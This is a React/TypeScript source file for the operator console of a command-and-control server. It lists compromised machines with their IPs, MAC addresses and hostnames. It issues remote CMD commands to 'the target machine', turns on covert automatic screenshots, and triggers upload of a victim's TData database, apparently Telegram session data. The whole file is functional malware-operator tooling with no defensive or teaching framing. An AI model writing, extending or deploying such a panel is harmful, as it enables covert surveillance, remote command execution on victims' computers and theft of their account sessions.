import { listC2DeviceVoByPageUsingPost, deleteC2DeviceUsingPost, updateHeartbeatUsingPost } from '@/services/backend/c2DeviceController';
import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
import type { ActionType, ProColumns } from '@ant-design/pro-components';
import { PageContainer, ProTable, ModalForm, ProFormSelect, ProFormText, ProFormTextArea } from '@ant-design/pro-components';
import { history } from '@umijs/max';
import { Button, message, Tag, Space, Typography, Image, Popconfirm, Modal, Dropdown, Menu } from 'antd';
import { DownOutlined, CameraOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, AppstoreOutlined } from '@ant-design/icons';
import React, { useRef, useState } from 'react';

const C2DevicePage: React.FC = () => {
  const actionRef = useRef<ActionType>();
  const [createModalVisible, setCreateModalVisible] = useState<boolean>(false);
  const [heartbeatModalVisible, setHeartbeatModalVisible] = useState<boolean>(false);
  const [currentDevice, setCurrentDevice] = useState<API.C2DeviceVO>();
  const [currentHeartbeat, setCurrentHeartbeat] = useState<number>(60000);
  
  // 结果查看 Modal 状态
  const [resultModalVisible, setResultModalVisible] = useState<boolean>(false);
  const [currentResultContent, setCurrentResultContent] = useState<string>('');

  const handleUpdateHeartbeat = async (uuid: string, interval: number) => {
    const hide = message.loading('正在下发心跳更新任务');
    try {
      // Use Task instead of direct update
      await addC2TaskUsingPost({
          deviceUuid: uuid,
          command: 'set_heartbeat',
          params: String(interval)
      });
      hide();
      message.success('心跳更新任务已下发，等待客户端确认');
      actionRef.current?.reload();
      return true;
    } catch (error: any) {
      hide();
      message.error('任务下发失败，' + error.message);
      return false;
    }
  };
  
  const handleDelete = async (row: API.C2DeviceVO) => {
    const hide = message.loading('正在删除');
    if (!row) return true;
    try {
      await deleteC2DeviceUsingPost({
        id: row.id as any,
      });
      hide();
      message.success('删除成功');
      actionRef?.current?.reload();
      return true;
    } catch (error: any) {
      hide();
      message.error('删除失败，' + error.message);
      return false;
    }
  };

  const handleAddTask = async (fields: API.C2TaskAddRequest) => {
    const hide = message.loading('正在下发任务');
    try {
      await addC2TaskUsingPost({ ...fields });
      hide();
      message.success('任务下发成功');
      return true;
    } catch (error: any) {
      hide();
      message.error('任务下发失败，' + error.message);
      return false;
    }
  };

  /**
   * 渲染任务子表格
   */
  const expandedRowRender = (record: API.C2DeviceVO) => {
    const taskColumns: ProColumns<API.C2TaskVO>[] = [
      { title: '命令', dataIndex: 'command', width: 100 },
      { title: '参数', dataIndex: 'params', width: 150, ellipsis: true },
      { 
        title: '状态', 
        dataIndex: 'status', 
        width: 100,
        valueEnum: {
          pending: { text: '等待中', status: 'Default' },
          completed: { text: '已完成', status: 'Success' },
          failed: { text: '失败', status: 'Error' },
        },
      },
      {
        title: '执行结果',
        dataIndex: 'result',
        render: (_, task) => {
          if (!task.result) return '-';
          
          // 判断是否为图片，如果是图片则显示文字提示，不再显示预览图
          const isImage = task.command === 'screenshot' || task.command === 'start_monitor' || task.result.startsWith('iVBORw0KGgo') || task.result.startsWith('data:image') || task.result.startsWith('/api/');
          
          if (isImage && task.status === 'completed') {
             return <span>[图片已保存到截图记录]</span>;
          }
          
          const content = task.result;
          const maxLength = 100;
          const isLongText = content.length > maxLength;
          
          return (
            <div>
              <Typography.Paragraph
                style={{ marginBottom: 0 }}
                ellipsis={{ rows: 2 }}
              >
                {content}
              </Typography.Paragraph>
              {isLongText && (
                  <a onClick={() => {
                      setCurrentResultContent(content);
                      setResultModalVisible(true);
                  }}>
                      查看完整结果
                  </a>
              )}
            </div>
          );
        },
      },
      { title: '创建时间', dataIndex: 'createTime', valueType: 'dateTime', width: 180 },
    ];

    return (
      <ProTable<API.C2TaskVO>
        columns={taskColumns}
        headerTitle={false}
        search={false}
        options={false}
        rowKey="id"
        request={async (params) => {
          const { data, code } = await listC2TaskVoByPageUsingPost({
            ...params,
            deviceUuid: record.uuid,
            pageSize: 100,
            sortField: 'createTime',
            sortOrder: 'descend',
          } as API.C2TaskQueryRequest);
          return {
            success: code === 0,
            data: data?.records || [],
            total: data?.total || 0,
          };
        }}
        pagination={false}
      />
    );
  };

  const columns: ProColumns<API.C2DeviceVO>[] = [
    {
      title: '设备UUID',
      dataIndex: 'uuid',
      valueType: 'text',
      copyable: true,
      width: 150,
      ellipsis: true,
    },

    {
      title: '内网IP',
      dataIndex: 'internalIp',
      valueType: 'text',
    },
    {
      title: 'MAC地址',
      dataIndex: 'macAddress',
      valueType: 'text',
      copyable: true,
    },
    {
      title: '外网IP',
      dataIndex: 'externalIp',
      valueType: 'text',
    },
    {
      title: '主机名',
      dataIndex: 'hostName',
      valueType: 'text',
    },
    {
      title: '操作系统',
      dataIndex: 'os',
      valueType: 'text',
    },
    {
      title: '在线状态',
      dataIndex: 'status',
      hideInSearch: true,
      render: (_, record) => {
        if (!record.lastSeen) return <Tag color="red">离线</Tag>;
        const lastSeen = new Date(record.lastSeen).getTime();
        const now = new Date().getTime();
        // Use configured heartbeat interval + buffer (e.g., 30s) or fallback to 2 mins
        const interval = record.heartbeatInterval || 60000;
        const threshold = interval + 30 * 1000; 
        const isOnline = (now - lastSeen) < threshold;
        return isOnline ? <Tag color="green">在线</Tag> : <Tag color="red">离线</Tag>;
      },
    },
    {
      title: '数据状态',
      dataIndex: 'dataStatus',
      valueType: 'text',
      hideInSearch: true,
      render: (_, record) => {
        const status = record.dataStatus || 'Waiting';
        let color = 'default';
        if (status === 'Collecting') color = 'processing';
        else if (status === 'Uploading') color = 'warning';
        else if (status === 'Done') color = 'success';
        else if (status.startsWith('Error')) color = 'error';
        
        return <Tag color={color}>{status}</Tag>;
      },
    },
    {
      title: '自动截图',
      dataIndex: 'isMonitorOn',
      hideInSearch: true,
      valueType: 'select',
      valueEnum: {
        0: { text: '关闭', status: 'Default' },
        1: { text: '开启', status: 'Processing' },
      },
      render: (_, record) => {
          return record.isMonitorOn === 1 ? <Tag color="blue">开启</Tag> : <Tag>关闭</Tag>;
      }
    },
    {
      title: '心跳间隔 (秒)',
      dataIndex: 'heartbeatInterval',
      valueType: 'digit',
      hideInSearch: true,
      render: (_, record) => {
          return (record.heartbeatInterval || 60000) / 1000;
      }
    },
    {
      title: '最后活跃',
      dataIndex: 'lastSeen',
      valueType: 'dateTime',
      hideInSearch: true,
    },
    {
      title: '操作',
      dataIndex: 'option',
      valueType: 'option',
      render: (_, record) => {
          const menu = (
            <Menu onClick={async (e) => {
                if (e.key === 'upload_db') {
                     await handleAddTask({
                        deviceUuid: record.uuid,
                        command: 'upload_db',
                        params: ''
                     });
                }
            }}>
                <Menu.Item key="upload_db" icon={<CloudUploadOutlined />}>上传TData数据库</Menu.Item>
            </Menu>
          );
          
          return [
        <a
          key="detail"
          onClick={() => {
            history.push(`/c2/device/detail/${record.uuid}`);
          }}
        >
          查看详细
        </a>,
        <a
          key="task"
          onClick={() => {
            setCurrentDevice(record);
            setCreateModalVisible(true);
          }}
        >
          执行命令
        </a>,
        <a
          key="heartbeat"
          onClick={() => {
            setCurrentDevice(record);
            setCurrentHeartbeat(record.heartbeatInterval || 60000);
            setHeartbeatModalVisible(true);
          }}
        >
          设置心跳
        </a>,
        <Dropdown overlay={menu} key="more">
            <a onClick={e => e.preventDefault()}>
                更多 <DownOutlined />
            </a>
        </Dropdown>,
        <Popconfirm
          key="delete"
          title="确定要删除吗？"
          onConfirm={() => handleDelete(record)}
        >
          <a style={{ color: 'red' }}>删除</a>
        </Popconfirm>,
      ];
      },
    },
  ];

  return (
    <PageContainer>
      <ProTable<API.C2DeviceVO>
        headerTitle={'C2 设备列表（展开可查看该设备的所有任务及结果）'}
        actionRef={actionRef}
        rowKey="id"
        search={{
          labelWidth: 120,
        }}
        toolBarRender={() => [
          // <Button
          //   key="refresh"
          //   onClick={() => {
          //     actionRef.current?.reload();
          //   }}
          // >
          //   刷新列表
          // </Button>,
        ]}
        expandable={{ 
            expandedRowRender,
            // 每次展开都重新渲染，确保加载最新数据
            destroyOnClose: true
        }}
        request={async (params, sort, filter) => {
          const sortField = Object.keys(sort)?.[0];
          const sortOrder = sort?.[sortField] ?? undefined;

          const { data, code } = await listC2DeviceVoByPageUsingPost({
            ...params,
            sortField,
            sortOrder,
            ...filter,
          } as API.C2DeviceQueryRequest);

          return {
            success: code === 0,
            data: data?.records || [],
            total: Number(data?.total) || 0,
          };
        }}
        columns={columns}
      />
      <ModalForm
        title={'执行CMD命令'}
        width="400px"
        visible={createModalVisible}
        onVisibleChange={setCreateModalVisible}
        modalProps={{ destroyOnClose: true }}
        onFinish={async (value) => {
          const success = await handleAddTask({
            ...value,
            command: 'cmd_exec', // 强制指定命令类型
            deviceUuid: currentDevice?.uuid,
          } as API.C2TaskAddRequest);
          if (success) {
            setCreateModalVisible(false);
            if (actionRef.current) {
              actionRef.current.reload();
            }
          }
        }}
      >
        {/* 隐藏的 deviceId 字段，确保表单提交时包含该字段 */}
        <ProFormText name="deviceUuid" initialValue={currentDevice?.uuid} hidden />
        <ProFormText
          label="设备UUID"
          name="deviceIdDisplay"
          disabled
          initialValue={currentDevice?.uuid || '未知设备'}
        />
        {/* 原本的命令选择已移除，默认执行 cmd_exec */}
        
        <ProFormTextArea
          label="CMD命令内容"
          name="params"
          placeholder="请输入要在目标机器执行的命令 (如 whoami, ipconfig)"
          rules={[{ required: true, message: '请输入命令内容' }]}
        />
      </ModalForm>
      <ModalForm
        title={'设置心跳间隔'}
        width="400px"
        visible={heartbeatModalVisible}
        onVisibleChange={setHeartbeatModalVisible}
        modalProps={{ destroyOnClose: true }}
        onFinish={async (value) => {
          if (!currentDevice?.uuid) {
             message.error('设备UUID不存在，无法更新心跳');
             return;
          }
          const success = await handleUpdateHeartbeat(currentDevice.uuid, value.heartbeatInterval * 1000);
          if (success) {
            setHeartbeatModalVisible(false);
          }
        }}
      >
        <ProFormText
          label="设备UUID"
          name="deviceIdDisplay"
          disabled
          initialValue={currentDevice?.uuid || currentDevice?.id || '未知'}
        />
        <ProFormSelect
          label="心跳间隔 (秒)"
          name="heartbeatInterval"
          rules={[{ required: true, message: '请选择心跳间隔' }]}
          valueEnum={{
            10: '10秒',
            30: '30秒',
            60: '60秒',
            300: '5分钟',
            600: '10分钟',
          }}
          initialValue={currentHeartbeat / 1000}
        />
      </ModalForm>
      
      {/* 结果查看 Modal */}
      <Modal
        title="完整执行结果"
        visible={resultModalVisible}
        onCancel={() => setResultModalVisible(false)}
        footer={[
            <Button key="close" onClick={() => setResultModalVisible(false)}>
                关闭
            </Button>
        ]}
        width={800}
      >
        <div style={{ maxHeight: '60vh', overflow: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
            {currentResultContent}
        </div>
      </Modal>
    </PageContainer>
  );
};

export default C2DevicePage;
